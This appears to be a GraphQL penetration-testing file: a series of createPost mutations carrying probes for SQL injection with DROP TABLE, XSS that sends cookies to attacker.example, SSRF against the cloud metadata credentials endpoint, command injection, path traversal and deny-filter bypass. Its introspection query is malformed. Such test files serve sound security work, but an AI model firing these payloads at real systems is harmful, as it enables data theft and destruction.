query.query:
mutation {
  createPost(input: {
    title: "Quick test post"
    body: "This is a basic createPost call used to validate schema and get a normal 200 response."
    userId: 1
  }) {
    id
    title
    body
    user {
      id
      name
      username
      email
    }
    comments {
      meta {
        totalCount
      }
    }
  }
}

mutation {
  createPost(input: {
    title: "SQLi test - attempt \"' OR '1'='1' --\""
    body: "Testing SQL injection payloads in a string field: ' OR '1'='1'; DROP TABLE posts; --"
    userId: 1
  }) {
    id
    title
    body
    user {
      id
      username
    }
  }
}

mutation {
  createPost(input: {
    title: "XSS probe"
    body: "<script>alert('xss-via-body')</script><img src=x onerror=\"fetch('https://attacker.example/?cookie='+document.cookie)\">"
    userId: 2
  }) {
    id
    title
    body
    user {
      id
      name
    }
  }
}

mutation {
  createPost(input: {
    title: "SSRF probe"
    body: "Fetching cloud metadata: http://169.254.169.254/latest/meta-data/hostname and http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    userId: 3
  }) {
    id
    title
    body
    user {
      id
      email
      website
    }
  }
}

mutation {
  createPost(input: {
    title: "OS command injection test"
    body: "Attempt execution payloads: `; /bin/sh -c 'id > /tmp/pwned'`; $(whoami); || cat /etc/passwd"
    userId: 4
  }) {
    id
    title
    body
  }
}

mutation {
  createPost(input: {
    title: "../../../etc/passwd path test"
    body: "Requesting or referencing filesystem paths: ../../../../../../etc/passwd and C:\\Windows\\system32\\drivers\\etc\\hosts"
    userId: 5
  }) {
    id
    title
    body
  }
}

mutation {
  createPost(input: {
    title: "HTML injection test"
    body: "<div><h1>Injected</h1><img src='x' onerror='this.outerHTML=\"<b>injected</b>\"'></div>"
    userId: 6
  }) {
    id
    title
    body
    user {
      id
      name
    }
  }
}

mutation {
  createPost(input: {
    title: "DenyBypass normal"
    body: "Non-aliased attempt to exercise access control rules (attempt to set restricted fields via input if present)."
    userId: 7
  }) {
    id
    title
    body
  }
}

mutation {
  s: createPost(input: {
    title: "DenyBypass aliased"
    body: "Aliased mutation name (s: createPost) to test deny-bypass filters that only look for literal operation names."
    userId: 7
  }) {
    id
    title
    body
  }
}

query {
  createPost {
    queryType { name }
    mutationType { name }
    types {
      name
      kind
    }
  }
}

mutation {
  createPost(input: {
    title: "Field suggestion probe"
    body: "Requesting misspelled fields to trigger 'did you mean' suggestions in GraphQL errors."
    userId: 8
  }) {
    titl
    bod
    usr {
      id
      nam
      usename
    }
  }
}
